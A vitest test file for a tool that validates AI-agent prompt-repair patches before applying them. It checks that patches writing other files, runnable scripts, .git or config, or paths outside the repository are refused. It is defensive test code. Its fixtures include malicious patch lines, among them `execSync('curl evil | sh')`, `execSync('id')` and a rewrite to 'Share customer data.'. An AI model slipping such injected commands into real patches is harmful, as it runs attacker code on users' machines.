import { execFileSync } from 'node:child_process';
import { mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { describe, expect, it } from 'vitest';
import { applyEdit, REPAIR_FILE_LIMIT, unifiedDiff, type RepairCandidate } from '../src/repair.js';
import { modelSwitch, patchFiles, repairNeverRewrites, repairNeverRewritesAt, repairPatchProblem, rewritableAnchors, rewriteHere } from '../src/repair-patch.js';
import { AGENTS_YAML, CONFIG_REWRITES, RUNNERS, TASKS_YAML } from './runner-fixtures.js';
import { times, timesOf } from './timing.js';

/**
 * A repair's patch, as `shadowlap fix apply` checks it before `git apply` puts it in: the change its
 * accepted candidate makes, to that candidate's file alone. The store it comes from can be someone
 * else's (a teammate's bucket), so a patch that writes anything else is refused.
 */

const AGENT = `const system = process.env.AGENT_SYSTEM ?? 'You are a support agent. Follow the refund policy.';
const tools = [
  { name: 'issue_refund', description: 'Refund an order.' },
  { name: 'escalate', description: 'Hand the case to a manager.' },
];
`;
const BEFORE = 'Follow the refund policy.';
const AFTER = 'Follow the refund policy: escalate every refund above the limit it sets.';

function candidate(o: Partial<RepairCandidate> = {}): RepairCandidate {
  return { id: 3, source: 'repairer', strategy: 's', why: 'w', surface: 'system prompt', file: 'agent.mjs', offset: AGENT.indexOf(BEFORE), before: BEFORE, after: AFTER, size: 1, state: 'accepted', reason: null, verify: null, ...o };
}

/** A report as repair writes it: the patch is unifiedDiff of the accepted candidate's edit. */
function report(c = candidate(), content = AGENT, patch?: string) {
  return { candidates: [candidate({ id: 1, state: 'rejected', after: 'x' }), c], accepted: c.id, patch: patch ?? unifiedDiff(c.file, content, applyEdit(content, { offset: c.offset, text: c.before }, c.after)) };
}

/** A repair of a whole prompt of six lines that rewrote its last line alone. */
function longPrompt(patch?: (own: string) => string) {
  const prompt = ['You are a support agent.', 'Be kind to customers always.', 'Check the order first please.', 'Read the refund policy fully.', 'Never share customer data.', BEFORE].join('\n');
  const file = `const system = \`${prompt}\`;\nexport default system;\n`;
  const c = candidate({ before: prompt, after: prompt.replace(BEFORE, AFTER), offset: file.indexOf(prompt) });
  const r = report(c, file);
  return patch ? { ...r, patch: patch(r.patch) } : r;
}

describe('repairPatchProblem', () => {
  it('takes the patch repair writes for its accepted candidate: mid-line, multi-line, at the end without a newline, CRLF', () => {
    expect(repairPatchProblem(report())).toBeNull();
    // A rewrite across lines, and one that adds lines.
    const two = `${AGENT}const note = 'Escalate.\nNever refund twice.';\n`;
    expect(repairPatchProblem(report(candidate({ before: 'Escalate.\nNever refund twice.', after: 'Escalate above $100.\nNever refund twice.\nAsk first.', offset: two.indexOf('Escalate.\n') }), two))).toBeNull();
    // The last line, with no newline after it.
    const open = `${AGENT}const model = 'gpt-4o'`;
    expect(repairPatchProblem(report(candidate({ before: 'gpt-4o', after: 'gpt-5', offset: open.indexOf('gpt-4o') }), open))).toBeNull();
    // Windows line endings stay in the lines.
    const crlf = AGENT.replace(/\n/g, '\r\n');
    expect(repairPatchProblem(report(candidate({ offset: crlf.indexOf(BEFORE) }), crlf))).toBeNull();
    // A file in a folder, with a space in its name.
    expect(repairPatchProblem(report(candidate({ file: 'src/support agent.mjs' })))).toBeNull();
    // A whole prompt of many lines rewritten in its last line alone: the hunk's context holds only
    // three of the lines before it, and the rest of the text is outside the patch.
    const whole = longPrompt();
    expect(whole.patch).not.toContain('Be kind to customers always.');
    expect(repairPatchProblem(whole)).toBeNull();
    // A rewrite that only adds text, and one that only takes some away.
    expect(repairPatchProblem(report(candidate({ after: `${BEFORE} Always.` })))).toBeNull();
    expect(repairPatchProblem(report(candidate({ before: 'You are a support agent. Follow the refund policy.', after: 'You are a support agent.', offset: AGENT.indexOf('You are') })))).toBeNull();
    // No patch, nothing to check.
    expect(repairPatchProblem({ candidates: [], accepted: null, patch: null })).toBeNull();
  });

  it('refuses a patch that writes another file too, makes a file, or touches another file only', () => {
    const own = report().patch;
    const evil = ['diff --git a/EVIL.txt b/EVIL.txt', 'new file mode 100644', '--- /dev/null', '+++ b/EVIL.txt', '@@ -0,0 +1 @@', '+from the bucket', ''].join('\n');
    const other = ['diff --git a/refund_agent.mjs b/refund_agent.mjs', '--- a/refund_agent.mjs', '+++ b/refund_agent.mjs', '@@ -1,1 +1,2 @@', "+(await import('node:fs')).writeFileSync('MARKER', 'ran');", ' // The ticket agent', ''].join('\n');
    expect(repairPatchProblem(report(candidate(), AGENT, evil + other))).toBe('it changes EVIL.txt and refund_agent.mjs, where its accepted candidate changes agent.mjs alone');
    expect(repairPatchProblem(report(candidate(), AGENT, own + evil))).toBe('it changes agent.mjs and EVIL.txt, where its accepted candidate changes agent.mjs alone');
    expect(repairPatchProblem(report(candidate(), AGENT, other))).toBe('it changes refund_agent.mjs, where its accepted candidate changes agent.mjs alone');
    // A traditional patch, with no diff --git line, is read the same way.
    expect(repairPatchProblem(report(candidate(), AGENT, other.split('\n').slice(1).join('\n')))).toMatch(/^it changes refund_agent\.mjs,/);
    // Renamed, copied, deleted, or given another mode: never what a repair writes.
    const header = (...extra: string[]) => ['diff --git a/agent.mjs b/agent.mjs', ...extra, ...own.split('\n').slice(1)].join('\n');
    for (const extra of [['old mode 100644', 'new mode 100755'], ['index 1234567..89abcde 100644'], ['deleted file mode 100644']]) {
      expect(repairPatchProblem(report(candidate(), AGENT, header(...extra))), extra.join(' ')).toMatch(/^its header is not the one a repair writes for agent\.mjs/);
    }
    expect(repairPatchProblem(report(candidate(), AGENT, ['diff --git a/agent.mjs b/run.sh', 'similarity index 90%', 'rename from agent.mjs', 'rename to run.sh', ''].join('\n')))).toBe('it changes agent.mjs and run.sh, where its accepted candidate changes agent.mjs alone');
    expect(repairPatchProblem(report(candidate(), AGENT, ['diff --git a/agent.mjs b/agent.mjs', 'GIT binary patch', 'literal 3', 'Hc$@<O00001', ''].join('\n')))).toMatch(/^its header is not the one/);
  });

  it("refuses a candidate that rewrites a recording or Shadowlap's config: a recorded command never changes through a repair", () => {
    // A pulled repair whose accepted candidate rewrites a golden's recorded command: its patch is that rewrite exactly.
    const content = '{\n  "runs": [\n    {\n      "command": {\n        "argv": [\n          "node",\n          "agent.mjs"\n        ],\n';
    const before = '"node",\n          "agent.mjs"';
    const after = '"sh",\n          "-c",\n          "touch never-run"';
    const pulled = (file: string) => report(candidate({ file, offset: content.indexOf(before), before, after }), content);
    expect(repairPatchProblem(pulled('goldens/refund/run.json'))).toBe("its accepted candidate rewrites goldens/refund/run.json, a pack's run.json, which holds the command a replay of the recording runs: a repair rewrites only the text the agent sends the model, where the agent's source holds it");
    // Read as Windows reads a name too: in any case, without the dots it drops, as a stream or a short name.
    for (const file of ['goldens/refund/RUN.JSON', 'goldens/refund/run.json.', 'goldens/refund/run.json::$DATA', 'goldens/refund/RUN~1.JSO', 'goldens/refund/calls.jsonl', `goldens/refund/blobs/${'a'.repeat(64)}`, '__recordings__/refund.json', 'src/__Recordings__/refund.json', '.shadowlap/repairs/r1/fix.patch', 'shadowlap.config.json', 'agents/Shadowlap.Config.json']) {
      expect(repairPatchProblem(pulled(file)), file).toMatch(/^its accepted candidate rewrites .*: a repair rewrites only the text the agent sends the model/);
    }
    // A file of the agent's own, whatever its folder is called, is one a repair rewrites.
    for (const file of ['src/prompt.txt', 'prompts/run.md', 'src/blobs/prompt.ts', 'run.json.md']) expect(repairPatchProblem(pulled(file)), file).toBeNull();
    expect(repairNeverRewrites('goldens/refund/run.json')).toMatch(/run\.json/);
    expect(repairNeverRewrites('agent.mjs')).toBeNull();
    // Nor anything in git's own folder, at any depth, its name read as Windows reads it.
    for (const file of ['.git/config', '.GIT/hooks/pre-commit', 'vendor/lib/.git/config', '.git./config', '.git /config']) expect(repairNeverRewrites(file), file).toBe("a file in git's own folder, where the repository and its config are, which can hold a credential");
    for (const file of ['.gitignore', '.github/workflows/ci.yml', 'docs/.gitkeep']) expect(repairNeverRewrites(file), file).toBeNull();
  });

  it("refuses a patch to the candidate's file that is not the candidate's rewrite", () => {
    const own = report().patch;
    expect(own).toContain('\n@@ -1,4 +1,4 @@\n');
    // A line put in beside the rewrite.
    const more = own.replace('@@ -1,4 +1,4 @@', '@@ -1,4 +1,5 @@').replace(/^\+const system(.*)$/m, "+const system$1\n+require('child_process').execSync('curl evil | sh');");
    expect(repairPatchProblem(report(candidate(), AGENT, more))).toBe("the lines it changes in agent.mjs are not its accepted candidate's rewrite");
    // Another rewrite than the one verified.
    expect(repairPatchProblem(report(candidate(), AGENT, own.replace(AFTER, 'Refund anything.')))).toBe("the lines it changes in agent.mjs are not its accepted candidate's rewrite");
    // The candidate's rewrite, and a context line beside it changed too.
    const context = own.replace(/^ const tools = \[$/m, "-const tools = [\n+const tools = [require('child_process').execSync('id'),");
    expect(context).not.toBe(own);
    expect(repairPatchProblem(report(candidate(), AGENT, context))).toBe("the lines it changes in agent.mjs are not its accepted candidate's rewrite");
    // A long rewrite whose patch also changes a line of the text that the candidate keeps.
    const sneaked = longPrompt((p) => p.replace(/^ Never share customer data\.$/m, '-Never share customer data.\n+Share customer data.'));
    expect(sneaked.patch).toContain('+Share customer data.');
    expect(repairPatchProblem(sneaked)).toBe("the lines it changes in agent.mjs are not its accepted candidate's rewrite");
    // A second hunk further down.
    expect(repairPatchProblem(report(candidate(), AGENT, `${own}@@ -9,1 +9,2 @@\n context\n+added\n`))).toBe('it holds more than the one hunk a repair writes');
    // A hunk whose counts don't match its lines, or with a line that is none of its kinds.
    expect(repairPatchProblem(report(candidate(), AGENT, own.replace('@@ -1,4 +1,4 @@', '@@ -1,3 +1,3 @@')))).toBe('it holds more than the one hunk a repair writes');
    expect(repairPatchProblem(report(candidate(), AGENT, own.replace('@@ -1,4 +1,4 @@', '@@ -1,9 +1,9 @@')))).toBe('its hunk holds a different number of lines than its header says');
    expect(repairPatchProblem(report(candidate(), AGENT, own.replace("\n const tools", '\n\nconst tools')))).toBe('a line in its hunk is neither context, removed nor added');
  });

  it('reads a patch from the store in time that grows with its length alone, and refuses one larger than a repair writes', () => {
    const one = (before: string, after: string, patch: string) => ({ patch, accepted: 1, candidates: [candidate({ id: 1, before, after })] });
    const hunk = (old: string[], now: string[], same: string[] = []) => ['diff --git a/agent.mjs b/agent.mjs', '--- a/agent.mjs', '+++ b/agent.mjs', `@@ -1,${same.length + old.length} +1,${same.length + now.length} @@`, ...same.map((l) => ` ${l}`), ...old.map((l) => `-${l}`), ...now.map((l) => `+${l}`), ''].join('\n');
    // Each check held against this machine, not a number of milliseconds: a pass over the patch that
    // writes every character again, which a check takes up to 5 times on Node 22 and up to 10 times on
    // Node 24, whose pass takes a third as long. Rebuilding the hunk at every place the candidate's
    // text appears took the square of its length: 27 seconds on the first of these, over a thousand
    // times the pass. Under 100 times leaves room for both and fails that.
    const quick = (r: ReturnType<typeof one>) => {
      const t = timesOf({ check: () => repairPatchProblem(r), pass: () => r.patch.replace(/a/g, 'b') }, { rounds: 2 });
      expect(t.check, `the check took ${times(t.check, t.pass)} a pass over the patch`).toBeLessThan(100 * t.pass);
      return repairPatchProblem(r);
    };
    const not = "the lines it changes in agent.mjs are not its accepted candidate's rewrite";
    // About 1 MB of context holding the candidate's text on every line: every line was a place to try it.
    const context = hunk([], [], Array.from({ length: 340_000 }, () => 'a'));
    expect(context.length).toBeGreaterThan(1_000_000);
    expect(quick(one('a', 'b', context))).toBe(not);
    // Text added where it could go anywhere in a long line, and is not in the patch.
    expect(quick(one('x', `x${'a'.repeat(300)}b`, hunk(['a'.repeat(300_000)], ['a'.repeat(300_301)])))).toBe(not);
    expect(quick(one('a', 'aa', context))).toBe(not);
    expect(quick(one('aa', 'a', context))).toBe(not);
    // A long line rewritten for real is still taken, as quickly.
    expect(quick(one('a'.repeat(300_000), 'a'.repeat(300_500), hunk(['a'.repeat(300_000)], ['a'.repeat(300_500)])))).toBeNull();
    expect(quick(one(`${'a'.repeat(300_000)}b`, `${'a'.repeat(300_000)}c`, hunk([`${'a'.repeat(300_000)}b`], [`${'a'.repeat(300_000)}c`])))).toBeNull();
    // Larger than what a repair writes: a patch, the text it rewrites, the rewrite; and a rewrite of nothing.
    expect(quick(one('a', 'b', hunk([], [], Array.from({ length: 2_000_000 }, () => 'a'))))).toMatch(/^it is 6000\d+ characters, more than a repair writes for its accepted candidate$/);
    expect(quick(one('a'.repeat(REPAIR_FILE_LIMIT + 1), 'b', context))).toBe(`its accepted candidate's text is ${REPAIR_FILE_LIMIT + 1} characters, longer than any file a repair reads`);
    expect(quick(one('a', 'b'.repeat(601), context))).toBe("its accepted candidate's rewrite is 601 characters, longer than a repair keeps for the 1 it replaces");
    expect(quick(one('a', 'a', context))).toBe('its accepted candidate changes nothing');
  });

  it('refuses a candidate that names a path outside the repository, or none', () => {
    for (const file of ['../outside.mjs', '/etc/profile', '.git/hooks/post-checkout', 'src/../../x', 'C:/x.mjs', ' agent.mjs', 'a\tb', '"agent.mjs"']) {
      const c = candidate({ file });
      expect(repairPatchProblem(report(c, AGENT, unifiedDiff(file, AGENT, AGENT.replace(BEFORE, AFTER)))), file).toMatch(/is not a plain path inside the repository$/);
    }
    expect(repairPatchProblem({ ...report(), accepted: 9 })).toBe('no accepted candidate comes with it');
  });

  it('refuses a candidate that rewrites a file that runs, or one a repair rewrites no text in; a value that runs is for the working tree to tell', () => {
    for (const r of RUNNERS) {
      const c = candidate({ file: r.file, offset: r.content.indexOf(r.before), before: r.before, after: r.after });
      expect(repairPatchProblem(report(c, r.content)), r.file).toBe(r.runs === 'file' ? `its accepted candidate rewrites ${r.file}, ${r.what}: a repair never rewrites a file that runs` : null);
    }
    // Read as Windows and macOS read a name too: in any case, without the dots and spaces dropped from its end.
    for (const file of ['.GitHub/Workflows/CI.yml', '.github/workflows./ci.yml', 'DOCKERFILE', 'docker/Dockerfile.dev', 'GNUmakefile', 'tools/build.mk', 'scripts/Deploy.SH']) {
      const content = 'echo build\n';
      const c = candidate({ file, offset: 0, before: 'echo build', after: 'echo build again' });
      expect(repairPatchProblem(report(c, content)), file).toMatch(/: a repair never rewrites a file that runs$/);
    }
    const tail = 'a repair rewrites text only in a string of JavaScript, TypeScript or Python source, a string value of YAML, JSON or TOML, or a Markdown, plain text, prompt or Jinja file';
    const content = `prompt = "${BEFORE}"\n`;
    for (const [file, kind] of [['main.go', 'a .go file'], ['lib/agent.rb', 'a .rb file'], ['docs/page.mdx', 'a .mdx file'], ['notebook.ipynb', 'a .ipynb file'], ['.gitignore', 'a file with no extension']]) {
      const c = candidate({ file, offset: content.indexOf(BEFORE), before: BEFORE, after: AFTER });
      expect(repairPatchProblem(report(c, content)), file).toBe(`its accepted candidate rewrites ${file}, ${kind}: ${tail}`);
    }
  });
});

describe('repairNeverRewritesAt', () => {
  const at = (path: string, content: string, text: string) => repairNeverRewritesAt({ path, content }, content.indexOf(text), text.length);

  it('takes text inside one string of JavaScript, TypeScript or Python, and any text of a Markdown, plain text, prompt or Jinja file', () => {
    expect(at('agent.mjs', AGENT, BEFORE)).toBeNull();
    expect(at('agent.mjs', AGENT, 'Hand the case to a manager.')).toBeNull();
    expect(at('src/prompt.tsx', 'export const p = (limit: number) => `Refunds above ${limit} need a manager.`;\n', 'Refunds above ${limit} need a manager.')).toBeNull();
    expect(at('tools.py', 'def refund():\n    """Refund an order.\n\n    Never twice."""\n', 'Refund an order.\n\n    Never twice.')).toBeNull();
    expect(at('agent.py', 'SYSTEM = f"Refunds above {limit} need a manager."\n', 'Refunds above {limit} need a manager.')).toBeNull();
    expect(at('agent.py', "MODEL = os.environ.get('MODEL', 'small-model')\n", 'small-model')).toBeNull();
    for (const path of ['prompts/policy.md', 'system.txt', 'docs/agent.rst', 'refund.prompt', 'templates/system.j2', 'templates/system.jinja2']) {
      expect(at(path, 'Refunds above {{ limit }} need a manager.\n', 'above {{ limit }} need'), path).toBeNull();
    }
  });

  it("takes text inside one string value of YAML, JSON or TOML: CrewAI's prompts, a config's model, a value beside one that runs", () => {
    for (const r of CONFIG_REWRITES) expect(at(r.file, r.content, r.before), `${r.file}: ${r.before}`).toBeNull();
    // A line of a block over several, and a TOML string over several lines.
    expect(at('config/tasks.yaml', TASKS_YAML, 'Conduct a thorough research')).toBeNull();
    expect(at('agent.toml', '[agent]\nprompt = """\nYou are a support agent.\nFollow the refund policy."""\n', 'support agent.\nFollow the refund')).toBeNull();
  });

  it('refuses text outside one string value, over the lines of a YAML value, inside a placeholder, or rewritten into YAML syntax', () => {
    const outside = 'is outside any string value: in YAML, JSON or TOML, a repair rewrites only text inside one string value';
    expect(at('config/agents.yaml', AGENTS_YAML, 'researcher:')).toBe(outside);
    expect(at('config/agent.json', '{\n  "model": "small-model",\n  "temperature": 0\n}\n', '"temperature": 0')).toBe(outside);
    expect(at('config/agents.yaml', 'tools: [search, scrape_website]\n', 'search')).toBe(outside);
    expect(at('config/agents.yaml', 'verbose: true\n', 'true')).toBe(outside);
    expect(at('config/agents.yaml', AGENTS_YAML, 'latest developments in {topic}.\n    Known for')).toBe("runs over lines of a YAML value: a rewrite there stays on one line, since YAML reads a line's indentation");
    expect(at('config/agent.json', '{ "a": "one", "b": "two" }\n', 'one", "b": "two')).toBe('runs past the end of the string value it starts in: a repair rewrites text inside one string value');
    expect(at('config/agents.yaml', AGENTS_YAML, 'on {topic')).toBe('starts or ends inside {topic}: a rewrite keeps each placeholder whole');
    // A plain value's rewrite stays text: no YAML syntax at its start, no key, no comment, no value that is no text.
    const role = (replace: string) => repairNeverRewritesAt({ path: 'config/agents.yaml', content: AGENTS_YAML }, AGENTS_YAML.indexOf('Senior Data'), 'Senior Data Researcher on {topic}'.length, replace);
    expect(role('Senior Data Researcher on {topic}, who checks every source')).toBeNull();
    expect(role('*Senior Data Researcher on {topic}')).toBe('is a plain YAML value its rewrite would start it with "*", which YAML reads as its own syntax there');
    expect(role('Senior Data Researcher on {topic}: every source')).toBe("is a plain YAML value its rewrite would put a ': ' in it, which YAML reads as a key");
    expect(role('Senior Data Researcher on {topic} #rated')).toBe("is a plain YAML value its rewrite would put a ' #' in it, which YAML reads as a comment");
    // A block's line and a quoted value take what is text there.
    const backstory = 'Known for your ability to find the most relevant information and present it clearly.';
    expect(repairNeverRewritesAt({ path: 'config/agents.yaml', content: AGENTS_YAML }, AGENTS_YAML.indexOf(backstory), backstory.length, `${backstory} Note: cite sources #always`)).toBeNull();
  });

  it('refuses code, a comment, text past the end of its string, and text that starts or ends inside a placeholder', () => {
    const outside = 'is outside any string: in code, a repair rewrites only text inside a string';
    expect(at('agent.mjs', AGENT, 'const tools = [')).toBe(outside);
    expect(at('agent.mjs', `// ${BEFORE}\nconst a = 1;\n`, BEFORE)).toBe(outside);
    expect(at('agent.py', `# ${BEFORE}\nrun(cmd, shell=False)\n`, 'shell=False')).toBe(outside);
    expect(at('agent.mjs', 'const re = /Follow the refund policy/;\n', 'Follow the refund policy')).toBe(outside);
    const past = 'runs past the end of the string it starts in: a repair rewrites text inside one string';
    expect(at('agent.mjs', AGENT, "refund policy.';")).toBe(past);
    expect(at('agent.mjs', "const a = 'one', b = 'two';\n", "one', b = 'two")).toBe(past);
    const inside = (p: string) => `starts or ends inside ${p}: a rewrite keeps each placeholder whole`;
    expect(at('agent.py', 'SYSTEM = f"Refunds above {limit} need a manager."\n', 'limit} need a manager.')).toBe(inside('{limit}'));
    expect(at('agent.mjs', 'const s = `Refunds above ${policy.limit} need a manager.`;\n', 'Refunds above ${policy')).toBe(inside('${policy.limit}'));
    expect(at('prompts/policy.md', 'Refunds above {{ limit }} need a manager.\n', 'limit }} need a manager.')).toBe(inside('{{ limit }}'));
  });

  it('refuses every runner, a file that runs or a value that runs, with why', () => {
    for (const r of RUNNERS) expect(at(r.file, r.content, r.before), r.file).toBe(`is in ${r.what}: a repair never rewrites what runs`);
    // So is an anchored value in a compose file, which an alias can make a command.
    const anchored = 'x-run: &run "python agent.py --serve"\nservices:\n  agent:\n    command: *run\n';
    expect(at('docker-compose.yml', anchored, 'python agent.py --serve')).toBe(`is in ${RUNNERS.find((r) => r.file === 'docker-compose.yml')!.what}: a repair never rewrites what runs`);
  });

  it("refuses every other kind of file, whose text Shadowlap can't tell from code", () => {
    for (const [path, kind] of [['main.go', 'a .go file'], ['lib/agent.rb', 'a .rb file'], ['docs/page.mdx', 'a .mdx file'], ['notebook.ipynb', 'a .ipynb file'], ['.gitignore', 'a file with no extension']]) {
      expect(at(path, 'run: npm test\n', 'npm test'), path).toBe(`is in ${kind}: a repair rewrites text only in a string of JavaScript, TypeScript or Python source, a string value of YAML, JSON or TOML, or a Markdown, plain text, prompt or Jinja file`);
    }
  });
});

describe('rewriteHere', () => {
  /** A pulled repair whose accepted candidate rewrites `before` in `file` to `after`, its patch made on `content`, checked against the file as it is `here`. */
  const pulled = (file: string, content: string, before: string, after: string, here = content) => rewriteHere(report(candidate({ file, offset: content.indexOf(before), before, after }), content), here);
  const why = (file: string, reason: string) => ({ problem: `here, the text its accepted candidate rewrites in ${file} ${reason}` });

  it("takes a repair's rewrite where its patch puts it: in place, lower down, with CRLF here, a model's name, a Markdown prompt", () => {
    expect(pulled('agent.mjs', AGENT, BEFORE, AFTER)).toEqual({ problem: null });
    // Lines added above it since: the patch goes in lower down, and is checked there.
    expect(pulled('agent.mjs', AGENT, BEFORE, AFTER, `// The agent.\n\n${AGENT}`)).toEqual({ problem: null });
    // A teammate's patch with LF, for a checkout whose file has CRLF.
    expect(pulled('agent.mjs', AGENT, BEFORE, AFTER, AGENT.replace(/\n/g, '\r\n'))).toEqual({ problem: null });
    // A switch of model: the name alone, quoted, and in a comment too.
    expect(pulled('agent.mjs', "const model = process.env.MODEL ?? 'small-model'; // small-model is the cheap one\n", 'small-model', 'big-model')).toEqual({ problem: null });
    expect(pulled('prompts/policy.md', '# Policy\n\nRefunds above {{ limit }} need a manager.\n', 'need a manager.', "need a manager: don't issue them.")).toEqual({ problem: null });
    // Text added that repeats what is beside it, where the file and the patched file first differ further on.
    expect(pulled('agent.mjs', "const s = 'This is very important.';\n", 'This is very important.', 'This is very very important.')).toEqual({ problem: null });
    // The text a whole long prompt holds, its last line rewritten: the patch holds only the lines around it.
    const whole = longPrompt();
    const c = whole.candidates.find((x) => x.id === whole.accepted)!;
    const file = `const system = \`${c.before}\`;\nexport default system;\n`;
    expect(rewriteHere(whole, file)).toEqual({ problem: null });
    // Nothing to check where the patch's lines aren't: it is in already, or the file changed since.
    expect(pulled('agent.mjs', AGENT, BEFORE, AFTER, AGENT.replace(BEFORE, AFTER))).toBeNull();
  });

  it('refuses a rewrite of code, of text past the end of its string, or inside a placeholder, in the file as it is here', () => {
    expect(pulled('agent.mjs', AGENT, 'const tools = [', 'const tools = [process.exit(),')).toEqual(why('agent.mjs', 'is outside any string: in code, a repair rewrites only text inside a string'));
    expect(pulled('agent.mjs', AGENT, "refund policy.';\nconst tools", "refund policy.';\nconst tools = process.exitCode")).toEqual(why('agent.mjs', 'runs past the end of the string it starts in: a repair rewrites text inside one string'));
    expect(pulled('agent.py', 'SYSTEM = f"Refunds above {limit} need a manager."\n', 'limit} need a manager.', 'os.getcwd()} need a manager.')).toEqual(why('agent.py', 'starts or ends inside {limit}: a rewrite keeps each placeholder whole'));
    // In a string where it was made, and code here: a triple quote above the patch's lines is a comment's.
    const lines = ['a', 'b', 'c', 'd', 'run(shell=False)', 'e', 'f', 'g', 'h', '"""', ''];
    const made = `PROMPT = """\n${lines.join('\n')}`;
    const here = `PROMPT = 0  # """\n${lines.join('\n')}`;
    expect(pulled('agent.py', made, 'shell=False', 'shell=True')).toEqual({ problem: null });
    expect(pulled('agent.py', made, 'shell=False', 'shell=True', here)).toEqual(why('agent.py', 'is outside any string: in code, a repair rewrites only text inside a string'));
  });

  it('refuses a rewrite repair sets aside: a quote, a placeholder, a line break in one-line text, white space at either end', () => {
    const aside = (reason: string) => ({ problem: `its accepted candidate's rewrite is one a repair sets aside: ${reason}` });
    expect(pulled('agent.mjs', AGENT, BEFORE, `${BEFORE} Don't refund twice.`)).toEqual(aside("it adds a ' quote, 1 where the text it replaces has none, which could end the string it goes into in agent.mjs"));
    expect(pulled('agent.mjs', AGENT, BEFORE, `${BEFORE} Today is \${new Date()}.`)).toEqual(aside('it brings in ${new Date()}, which agent.mjs could fill in when the agent builds its prompt, as code or as a value of the agent\'s: a rewrite keeps the placeholders of the text it replaces and adds none'));
    expect(pulled('agent.mjs', AGENT, BEFORE, `${BEFORE}\nEscalate.`)).toEqual(aside('the replacement spans several lines, and the text it replaces is one'));
    expect(pulled('agent.mjs', AGENT, BEFORE, ` ${AFTER}`)).toEqual({ problem: "its accepted candidate's rewrite starts or ends with white space, which a repair trims" });
  });

  it("refuses where the patch's lines are in the file more than once, or the candidate's text is not where they are", () => {
    expect(pulled('agent.mjs', AGENT, BEFORE, AFTER, `${AGENT}${AGENT}`)).toEqual({ problem: 'the lines it changes are in agent.mjs more than once here, so where it goes is not one place' });
    // A hunk of no line at all, which git puts at the top of the file: never one a repair writes.
    const top = { ...report(), patch: ['diff --git a/agent.mjs b/agent.mjs', '--- a/agent.mjs', '+++ b/agent.mjs', '@@ -0,0 +1,1 @@', '+X', ''].join('\n') };
    top.candidates = top.candidates.map((x) => (x.id === top.accepted ? { ...x, before: 'a\nb', after: 'a\nX\nb' } : x));
    expect(rewriteHere(top, AGENT)).toEqual({ problem: "its hunk holds no line of agent.mjs, where a repair's holds the lines its rewrite changes" });
    const whole = longPrompt();
    const c = whole.candidates.find((x) => x.id === whole.accepted)!;
    const file = `const system = \`${c.before.replace('You are a support agent.', 'You are a sales agent.')}\`;\nexport default system;\n`;
    expect(rewriteHere(whole, file)).toEqual({ problem: "here, the text its accepted candidate rewrites is not where its patch changes agent.mjs" });
  });
});

describe("a repair's text in config: CrewAI's prompts, a config's model, and what runs", () => {
  /** CrewAI's prompts as an agent sends them: its role, goal and backstory, and its task, with {topic} filled in. */
  const sent = [
    { label: 'system prompt', text: "Senior Data Researcher on AI agents\nUncover cutting-edge developments in AI agents\nYou're a seasoned researcher with a knack for uncovering the latest developments in AI agents. Known for your ability to find the most relevant information and present it clearly." },
    { label: 'tool research', text: 'Conduct a thorough research about AI agents. Make sure you find any interesting and relevant information.' },
  ];

  it("anchors in CrewAI's agents.yaml and tasks.yaml: a role, a goal and a backstory, plain, quoted and folded, and a task's description", () => {
    const anchors = rewritableAnchors(sent, [{ path: 'config/agents.yaml', content: AGENTS_YAML }, { path: 'config/tasks.yaml', content: TASKS_YAML }]);
    expect(anchors.map((a) => [a.id, a.file, a.text])).toEqual([
      [1, 'config/agents.yaml', 'Senior Data Researcher on {topic}'],
      [2, 'config/agents.yaml', 'Uncover cutting-edge developments in {topic}'],
      [3, 'config/agents.yaml', "You're a seasoned researcher with a knack for uncovering the latest developments in {topic}."],
      [4, 'config/agents.yaml', 'Known for your ability to find the most relevant information and present it clearly.'],
      [5, 'config/tasks.yaml', 'Conduct a thorough research about {topic}.'],
      [6, 'config/tasks.yaml', 'Make sure you find any interesting and relevant information.'],
    ]);
    // A prompt only a workflow holds, in a step it runs, is never anchored.
    const workflow = { path: '.github/workflows/research.yml', content: 'on: push\njobs:\n  research:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo "Senior Data Researcher on AI agents"\n' };
    expect(rewritableAnchors([{ label: 'system prompt', text: 'Senior Data Researcher on AI agents' }], [workflow])).toEqual([]);
  });

  it('switches a model named in a JSON or a TOML config where it is, and none named in what runs', () => {
    const json = { path: 'config/agent.json', content: '{\n  "model": "small-model",\n  "temperature": 0\n}\n' };
    const toml = { path: 'agent.toml', content: '[agent]\nmodel = "small-model"\n' };
    expect(modelSwitch([json], 'small-model', 'big-model')).toEqual({ file: 'config/agent.json', offset: json.content.indexOf('small-model') });
    expect(modelSwitch([toml], 'small-model', 'big-model')).toEqual({ file: 'agent.toml', offset: toml.content.indexOf('small-model') });
    expect(modelSwitch([json, toml], 'small-model', 'big-model')).toEqual({ why: 'the model name small-model appears 2 times in the source as a string' });
    const compose = { path: 'docker-compose.yml', content: 'services:\n  agent:\n    command: python agent.py --model "small-model"\n' };
    expect(modelSwitch([compose], 'small-model', 'big-model')).toEqual({ why: 'the model name small-model is in docker-compose.yml, where a repair rewrites no text' });
    expect(modelSwitch([json], 'small-model', "big'model")).toEqual({ why: "it adds a ' quote, 1 where the text it replaces has none, which could end the string it goes into in config/agent.json" });
  });

  it('takes a pulled patch to them here, and refuses one to a value that runs, as the file reads here', () => {
    const pulled = (r: { file: string; content: string; before: string; after: string }) => rewriteHere(report(candidate({ file: r.file, offset: r.content.indexOf(r.before), before: r.before, after: r.after }), r.content), r.content);
    for (const r of CONFIG_REWRITES) expect(pulled(r), `${r.file}: ${r.before}`).toEqual({ problem: null });
    for (const r of RUNNERS.filter((x) => x.runs === 'value')) expect(pulled(r), r.file).toEqual({ problem: `here, the text its accepted candidate rewrites in ${r.file} is in ${r.what}: a repair never rewrites what runs` });
    // A plain value its rewrite would turn into YAML syntax: an alias, which a loader resolves.
    expect(pulled({ file: 'config/agents.yaml', content: AGENTS_YAML, before: 'Senior Data Researcher on {topic}', after: '*Senior Data Researcher on {topic}' })).toEqual({ problem: 'here, the text its accepted candidate rewrites in config/agents.yaml is a plain YAML value its rewrite would start it with "*", which YAML reads as its own syntax there' });
  });
});

/**
 * Each file's text after `git apply` of its patch, all in one call: what the patches really do to the
 * files. Applied to the files' bytes with no line-ending conversion, as `fix apply` applies one: under
 * core.autocrlf=true, which Git for Windows sets, git apply writes a file whose lines end with LF
 * back with CRLF.
 */
function gitApplied(cases: Array<{ before: string; patch: string }>): string[] {
  const dir = mkdtempSync(join(tmpdir(), 'shadowlap-patch-'));
  try {
    execFileSync('git', ['init', '-q'], { cwd: dir });
